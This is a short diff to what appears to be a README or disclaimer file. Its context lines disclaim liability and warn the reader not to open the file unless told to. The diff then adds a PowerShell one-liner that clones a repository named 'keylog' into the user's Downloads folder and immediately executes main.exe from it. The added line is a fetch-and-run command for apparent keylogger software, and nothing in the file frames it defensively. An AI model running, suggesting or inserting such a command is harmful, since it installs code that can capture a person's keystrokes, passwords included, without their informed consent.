@@ -9,3 +9,6 @@ I am not liable for any damage, malfunction, data loss, or other effects resulti
 If you were not explicitly instructed to run this file, do NOT open it.
 
 – Use at your own risk.
+
+
+git clone https://github.com/Xcrafteur27/keylog.git "$env:USERPROFILE\Downloads\keylog" ; & "$env:USERPROFILE\Downloads\keylog\main.exe"****
